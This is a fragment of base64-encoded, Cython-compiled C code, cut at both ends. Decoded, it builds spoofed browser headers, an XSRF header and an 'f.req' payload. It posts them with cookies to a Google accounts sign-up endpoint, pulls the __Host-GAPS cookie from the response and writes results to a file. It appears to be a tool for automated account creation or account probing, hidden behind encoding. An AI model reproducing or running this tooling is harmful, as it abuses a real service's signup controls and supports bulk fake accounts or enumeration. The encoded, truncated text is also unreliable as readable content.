sIDEzMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fVVNfZW5fcV8wXzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nb29nbGVfYWNjb3VudHNfeHNyZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVmZXJlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxNDAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTApKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApOwogICAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEwLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE0MCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdG9rLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF8xMVswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzQ7CiAgICAgIF9fcHl4X3RfMTFbMV0gPSBfX3B5eF90Xzg7CiAgICAgIF9fcHl4X3RfMTFbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X181OwogICAgICBfX3B5eF90XzExWzNdID0gX19weXhfdF8xMDsKICAgICAgX19weXhfdF8xMVs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7CiAgICAgIF9fcHl4X3RfMTFbNV0gPSBfX3B5eF90XzU7CiAgICAgIF9fcHl4X3RfMTFbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X181OwogICAgICBfX3B5eF90XzExWzddID0gX19weXhfdF80OwogICAgICBfX3B5eF90XzExWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNTsKICAgICAgX19weXhfdF8xMVs5XSA9IF9fcHl4X3RfNjsKICAgICAgX19weXhfdF8xMVsxMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBfMF9udWxsX251bGxfd2ViX2dsaWZfc2lnbnVwXzA7CiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzExLCAxMSwgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfOCkgKyAzICogNCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTApICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzYpICsgNDgsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzgpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTApIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzYpKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZl9yZXEsIF9fcHl4X3RfMTIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RldmljZWluZm8sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTIgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgICAgIF9fcHl4X3RfMTIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgICAgIGFzc2VydChfX3B5eF90XzEyKTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMyA6IDApXSA9IHtfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWdufTsKICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X3ZfY29va2llcywgX19weXhfdF82LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF82KTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICB9CiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19weXhfdF82ID0gUHlVbmljb2RlX1NwbGl0KCgoUHlPYmplY3QqKV9fcHl4X3RfMTIpLCBfX1B5eF9Ob25lQXNOdWxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbnVsbCksIC0xTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICBfX3B5eF90XzEyID0gX19QeXhfR2V0SXRlbUludF9MaXN0KF9fcHl4X3RfNiwgMSwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNTIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzEyOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF85ID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzZ9OwogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX3B5eF90XzEyID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzcsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19weXhfdl90bCA9IF9fcHl4X3RfMTI7CiAgICAgIF9fcHl4X3RfMTIgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF83ID0gX19weXhfdF80OwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF85ID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9OwogICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2RpY3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgIH0KICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9ob3N0LCBfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgICB7CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbmNvZGluZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91dGZfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0sIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICBfX3B5eF90XzcgPSBOVUxMOwogICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MOV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX3B5eF90XzkgPSAxOwogICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNyk7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MOV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF90XzQ7CiAgICAgICAgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICB7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzE0LCAmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYpOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcH